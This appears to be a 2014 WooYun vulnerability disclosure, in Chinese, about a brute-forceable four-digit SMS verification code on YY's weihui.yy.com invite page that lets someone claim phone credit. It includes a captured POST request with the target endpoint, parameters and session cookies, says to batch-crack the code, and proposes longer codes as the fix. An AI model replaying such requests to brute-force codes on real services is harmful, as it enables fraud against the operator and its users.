wybug_title: 多玩旗下微会存在验证码暴力破解导致刷话费
wybug_type: 系统/服务运维配置不当
wybug_detail:
漏洞详情 披露状态：   									2014-12-01：	细节已通知厂商并且等待厂商处理中									2014-12-02：	厂商已经确认，细节仅向厂商公开									2014-12-12：	细节向核心白帽子及相关领域专家公开									2014-12-22：	细节向普通白帽子公开									2015-01-01：	细节向实习白帽子公开									2015-01-15：	细节向公众公开  简要描述： 如下 详细说明：  今天偶然发现朋友圈有人发邀请话费的衔接衔接如下：http://weihui.yy.com/invite?app=MTQ%3D&uid=MzIxMzg2MDM3OA%3D%3D&by=d3hfY2lyY2xl&from=timeline&isappinstalled=0

然后点击验证抓包抓包数据如下：
POST /invite?app=MTQ%3D&uid=MzIxMzg2MDM3OA%3D%3D&by=d3hfY2lyY2xl&from=timeline&isappinstalled=0 HTTP/1.1Host: weihui.yy.comProxy-Connection: keep-aliveContent-Length: 38Accept: application/json, text/javascript, */*; q=0.01Origin: http://weihui.yy.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://weihui.yy.com/invite?app=MTQ%3D&uid=MzIxMzg2MDM3OA%3D%3D&by=d3hfY2lyY2xl&from=timeline&isappinstalled=0Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: bbs_ed28_saltkey=D1bWzD0z; bbs_ed28_lastvisit=1417183082; bbs_ed28_visitedfid=2018; hiido_ui=0.9804232731800039; CNZZDATA5910426=cnzz_eid%3D1926242116-1417181371-http%253A%252F%252Fwww.baidu.com%252F%26ntime%3D1417186772; bbs_ed28_lastact=1417186991%09forum.php%09forumdisplay; bbs_ed28_st_t=0%7C1417186991%7C3709fbcfadd1128832fa4e11b4db2187; bbs_ed28_forum_lastvisit=D_2018_1417186991; bbs_ed28_sid=R6oFbl; PHPSESSID=dkdad3rq5q99elbbnh3hgu6sc6phone=手机号码&code=1234（此处为四位验证）&t=validate
然后批量破解验证码

成功破解出验证码   漏洞证明：  今天偶然发现朋友圈有人发邀请话费的衔接衔接如下：http://weihui.yy.com/invite?app=MTQ%3D&uid=MzIxMzg2MDM3OA%3D%3D&by=d3hfY2lyY2xl&from=timeline&isappinstalled=0

然后点击验证抓包抓包数据如下：
POST /invite?app=MTQ%3D&uid=MzIxMzg2MDM3OA%3D%3D&by=d3hfY2lyY2xl&from=timeline&isappinstalled=0 HTTP/1.1Host: weihui.yy.comProxy-Connection: keep-aliveContent-Length: 38Accept: application/json, text/javascript, */*; q=0.01Origin: http://weihui.yy.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://weihui.yy.com/invite?app=MTQ%3D&uid=MzIxMzg2MDM3OA%3D%3D&by=d3hfY2lyY2xl&from=timeline&isappinstalled=0Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: bbs_ed28_saltkey=D1bWzD0z; bbs_ed28_lastvisit=1417183082; bbs_ed28_visitedfid=2018; hiido_ui=0.9804232731800039; CNZZDATA5910426=cnzz_eid%3D1926242116-1417181371-http%253A%252F%252Fwww.baidu.com%252F%26ntime%3D1417186772; bbs_ed28_lastact=1417186991%09forum.php%09forumdisplay; bbs_ed28_st_t=0%7C1417186991%7C3709fbcfadd1128832fa4e11b4db2187; bbs_ed28_forum_lastvisit=D_2018_1417186991; bbs_ed28_sid=R6oFbl; PHPSESSID=dkdad3rq5q99elbbnh3hgu6sc6phone=手机号码&code=1234（此处为四位验证）&t=validate
然后批量破解验证码

成功破解出验证码   修复方案：  多位验证   版权声明：转载请注明来源 ❤@乌云
